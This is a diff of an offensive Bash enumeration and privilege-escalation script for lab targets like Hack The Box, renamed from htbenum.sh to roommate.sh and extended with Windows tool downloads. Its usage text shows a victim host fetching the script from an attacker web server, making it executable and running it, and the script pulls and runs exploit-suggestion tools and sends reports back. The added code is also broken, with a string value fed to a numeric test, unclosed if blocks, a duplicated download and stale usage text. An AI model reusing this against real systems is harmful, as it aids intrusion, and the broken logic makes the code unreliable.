@@ -13,25 +13,42 @@ GREEN='\033[0;32m'
 BLUE='\033[0;34m'
 ORANGE='\033[0;33m'
 
+
 function banner () {
-	echo -e "${BLUE}";
-	echo "_   _ ___________ _____ _   _ _   ____  ___";
-	echo "| | | |_   _| ___ \  ___| \ | | | | |  \/  |";
-	echo "| |_| | | | | |_/ / |__ |  \| | | | | .  . |";
-	echo "|  _  | | | | ___ \  __|| . \` | | | | |\/| |";
-	echo "| | | | | | | |_/ / |___| |\  | |_| | |  | |";
-	echo "\_| |_/ \_/ \____/\____/\_| \_/\___/\_|  |_/";
-	echo -e "\n${ORANGE}By Solomon Sklash - solomonsklash@0xfeed.io ${NC}\n";
+	echo -e "${GREEN}";
+	echo "		01110010 01101111 01110100 01110100 01100101 01101110  01110010 01101111 01101111 01101101 01101101 01100001 01110100 01100101 ";
+	echo "";
+	echo -e "${RED}";
+	echo "					    >======>                  >=>     >=>                                            ";
+	echo "					    >=>    >=>                >=>     >=>                                            ";
+	echo "					    >=>    >=>      >=>     >=>>==> >=>>==>   >==>    >==>>==>                       ";
+	echo "					    >> >==>       >=>  >=>    >=>     >=>   >>   >=>   >=>  >=>                      ";
+	echo "					    >=>  >=>     >=>    >=>   >=>     >=>   >>===>>=>  >=>  >=>                      ";
+	echo "					    >=>    >=>    >=>  >=>    >=>     >=>   >>         >=>  >=>                      ";
+	echo "					    >=>      >=>    >=>        >=>     >=>   >====>   >==>  >=>                      ";
+	echo "";								                                                             
+	echo -e "${GREEN}";
+	echo "				>======>                                                                     >=>             ";
+	echo "				>=>    >=>                                                                   >=>             ";
+	echo "				>=>    >=>      >=>        >=>     >===>>=>>==>  >===>>=>>==>     >=> >=>  >=>>==>   >==>    ";
+	echo "				>> >==>       >=>  >=>   >=>  >=>   >=>  >>  >=>  >=>  >>  >=>  >=>   >=>    >=>   >>   >=>  ";
+	echo "				>=>  >=>     >=>    >=> >=>    >=>  >=>  >>  >=>  >=>  >>  >=> >=>    >=>    >=>   >>===>>=> ";
+	echo "				>=>    >=>    >=>  >=>   >=>  >=>   >=>  >>  >=>  >=>  >>  >=>  >=>   >=>    >=>   >>        ";
+	echo "				>=>      >=>    >=>        >=>     >==>  >>  >=> >==>  >>  >=>   >==>>>==>    >=>   >====>   ";
+	echo "";
+	echo "		01110010 01101111 01110100 01110100 01100101 01101110  01110010 01101111 01101111 01101101 01101101 01100001 01110100 01100101";
+	echo "01000001 01101110  01000101 01101110 01110101 01101101 01100101 01110010 01100001 01110100 01101001 01101111 01101110  01010100 01101111 01101111 01101100";
+	echo -e "\n${ORANGE}An Enumeration & Escalation Tool${NC}\n";
 }
 
 function usage () {
 		echo -e "${GREEN} Usage:";
-		echo -e "${GREEN}         ./htbenum.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
+		echo -e "${GREEN}         ./roommate.sh [-u] -i IP -p port [-o directory] [-w] [-r]\n";
 		echo -e "${GREEN}         htbenum is designed do Linux enumeration in environments like Hack The Box where ";
 		echo -e "${GREEN}         you do not have direct Internet access to download scripts and tools.\n";
 		echo -e "${GREEN}         It will download enumeration and exploit suggestion scripts to a Linux host and ";
 		echo -e "${GREEN}         automatically execute them, providing a saved text report for each tool, and ";
-		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload htbenum.sh ";
+		echo -e "${GREEN}         optionally upload the reports back top the host machine. Simply upload roommate.sh ";
 		echo -e "${GREEN}         to a host, run with the IP and port of the builtin web server hosting the tools ";
 		echo -e "${GREEN}         (or use your own), and they will be downloaded to /tmp (or an optional user-defined ";
 		echo -e "${GREEN}         directory) and executed, with report output being saved to /tmp or a custom directory.";
@@ -40,11 +57,11 @@ function usage () {
 		echo -e "${GREEN}         the update parameter in order to download all the necessary tools to the current ";
 		echo -e "${GREEN}         directory. Then start the builtin web server to host the tools and receive the reports.\n ";
 		echo -e "${GREEN} Example:";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -u";
-		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./htbenum.sh -i 10.10.14.1 -p 80 -w";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./htbenum.sh";
-		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./htbenum.sh -i 10.10.14.1 -p 80 -r\n";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./roommate.sh -u";
+		echo -e "${GREEN}         Host machine: root@kali:~/htbenum# ./roommate.sh -i 10.10.14.1 -p 80 -w";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ wget http://10.10.14.1:80/roommate.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ chmod +x ./roommate.sh";
+		echo -e "${GREEN}         Victim machine: www-data@victim:/tmp$ ./roommate.sh -i 10.10.14.1 -p 80 -r\n";
 		echo -e "${GREEN} Parameters:";
 		echo -e "${GREEN}         -h - View help and usage.";
 		echo -e "${GREEN}         -i IP - IP address of the listening web server used for upload and download.";
@@ -67,7 +84,7 @@ UPLOAD="";
 PY2="";
 PY3="";
 
-while getopts ":hi:p:o:wur" opt; do
+while getopts ":hi:p:d:wur" opt; do
 		case ${opt} in
 				h )
 						banner;
@@ -83,8 +100,12 @@ while getopts ":hi:p:o:wur" opt; do
 				p )
 						PORT=$OPTARG;
 						;;
-				o )
+				d )
 						DIR=$OPTARG;
+						;;
+
+				o )
+						OS=$OPTARG;
 						;;
 				w )
 						WEB=1;
@@ -107,18 +128,35 @@ shift $((OPTIND -1));
 function update () {
 		# Get all scripts, overwrite if they already exist
 		echo -e "${GREEN}[i] Updating all tools...${NC}";
-		# Enumeration scripts
-		wget -nv "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;
-		wget -nv "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh;
-		wget -nv "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py;
-		wget -nv "https://raw.githubusercontent.com/initstring/uptux/master/uptux.py" -O uptux.py;
-		wget -nv "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py;
-		# Exploit suggestion scripts
-		wget -nv "https://raw.githubusercontent.com/belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" -O les-soft.py;
-		wget -nv "https://raw.githubusercontent.com/offensive-security/exploit-database/master/files_exploits.csv" -O files_exploits.csv;
-		wget -nv "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh;
-		echo -e "${GREEN}[i] Update complete!${NC}";
-		exit 0;
+		if [ $OS -gt linux ]
+		then
+			# Linux Enumeration scripts
+			wget -nv "https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh" -O lse.sh;
+			wget -nv "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O linenum.sh;
+			wget -nv "https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py" -O linuxprivchecker.py;
+			wget -nv "https://raw.githubusercontent.com/initstring/uptux/master/uptux.py" -O uptux.py;
+			wget -nv "https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py" -O suid3num.py;
+			# Linux Exploit suggestion scripts
+			wget -nv "https://raw.githubusercontent.com/belane/linux-soft-exploit-suggester/master/linux-soft-exploit-suggester.py" -O les-soft.py;
+			wget -nv "https://raw.githubusercontent.com/offensive-security/exploit-database/master/files_exploits.csv" -O files_exploits.csv;
+			wget -nv "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh;
+			echo -e "${GREEN}[i] Update complete!${NC}";
+			exit 0;
+		else
+			if [ $OS -gt windows ]
+			then
+				# Windows Enumeration Scripts
+				wget -nv "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat" -O winPEAS.bat;
+				wget -nv "https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1" -O Sherlock.ps1;
+				wget -nv "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" -O PowerUp.ps1;
+				wget -nv "https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1" -O jaws-enum.ps1;
+				wget -nv "https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat" -O winPEAS.bat;		
+				# Windows Exploit suggestion scripts
+				wget -nv "https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py" -O windows-exploit-suggester.py;
+				echo -e "${GREEN}[i] Update complete!${NC}";
+				exit 0;
+			else
+			exit 0;
 }
 
 # Check Python versions available
